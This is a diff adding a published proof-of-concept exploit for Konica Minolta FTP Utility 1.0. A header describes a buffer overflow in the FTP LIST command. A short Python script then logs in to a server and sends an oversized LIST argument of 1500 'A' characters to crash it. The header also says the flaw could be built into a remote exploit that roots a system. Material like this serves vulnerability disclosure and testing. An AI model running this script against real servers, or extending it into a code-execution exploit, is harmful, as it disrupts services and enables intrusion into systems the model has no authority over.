@@ -1,0 +1,30 @@
+# Exploit Title: Konica Minolta FTP Utility 1.0 - 'LIST' Denial of Service (PoC) 
+# Date: 2020-05-16
+# Found by: Alvaro J. Gene (Socket_0x03)
+# Software Link: https://konica-minolta-ftp-utility.software.informer.com/download/
+# Vulnerable Application: Konica Minolta FTP Utility
+# Version: 1.0
+# Server: FTP Server
+# Vulnerable Command: LIST
+# Tested on: Windows 7 SP1
+
+# Impact: There is a buffer overflow vulnerability in the LIST command of the FTP server
+# "Konica Minolta FTP Utility" that will allow an attacker to overwrite some registers, 
+# such as EAX, ESI, EDI... Even though the next codes will crash the FTP server and overwrite 
+# some registers, an individual can use the vulnerable command to build a remote buffer 
+# overflow exploit that will root a system without any user interaction. 
+
+====================================================================================================
+=============== [ Konica Minolta FTP Utility v1.0 - 'LIST' Denial of Service (PoC) ] ===============
+====================================================================================================
+
+
+from ftplib import FTP
+
+ftp = FTP('192.168.0.16')
+
+buffer = "A" * 1500
+
+ftp.login()
+
+ftp.retrlines('LIST ' + buffer)
